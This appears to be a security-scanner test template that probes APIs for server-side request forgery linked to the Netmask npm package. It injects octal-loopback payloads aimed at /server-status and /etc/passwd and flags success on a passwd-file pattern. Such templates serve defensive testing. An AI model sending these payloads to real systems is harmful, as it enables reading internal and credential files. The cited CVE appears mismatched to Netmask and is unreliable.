id: NETMASK_SSRF
info:
  name: "Netmask NPM Package Server-Side Request Forgery"
  description: "This vulnerability affects applications that utilize the Netmask package for IP address management. This flaw allows attackers to manipulate requests made by the server to internal services, potentially exposing sensitive data or enabling further attacks. By exploiting this vulnerability, an attacker could access resources that are typically restricted, leading to significant security risks. Proper validation of user inputs and restricting outbound requests are essential to mitigate this issue."
  details:  "This vulnerability arises when the package is used to process user-controlled input, such as IP addresses. If an application fails to validate this input adequately, an attacker can craft requests that target internal services or other unintended endpoints. This can lead to unauthorized access to sensitive data or functionality within the server's network, bypassing security controls. Applications utilizing affected versions of the Netmask package are at risk, highlighting the importance of secure coding practices and input validation."
  impact: "The impact of this vulnerability can be significant, as it allows attackers to send crafted requests to internal services, potentially exposing sensitive information or administrative interfaces. This unauthorized access can lead to data breaches, manipulation of internal systems, or further attacks on the network. If exploited, it may enable attackers to escalate privileges or pivot to other services, increasing the overall risk to the application and the infrastructure it runs on."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: NETMASK_SSRF
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md"
    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
    - "https://www.cobalt.io/blog/from-ssrf-to-port-scanner"
  cwe:
    - CWE-918
  cve:
    - CVE-2021-28169

api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal
wordLists:
  paths:
    - "url"
    - "host"
    - "file"
  ssrfURLs:
    - "http://0177.0.0.1/server-status"
    - "http://0177.0.0.1/etc/passwd"
execute:
  type: single
  requests:
    - req:
      - modify_method: GET
      - add_query_param:
          ${paths}: ${ssrfURLs}
      - replace_body: '{}'


validate:
  response_code:
    eq: 200
  or:
  - response_payload:
      length:
        gt: 0
      contains_either:
      - "Apache Server Status"
      - "Server Version"
  - response_payload:
      length:
        gt: 0
      regex: "root:.*:0:0:"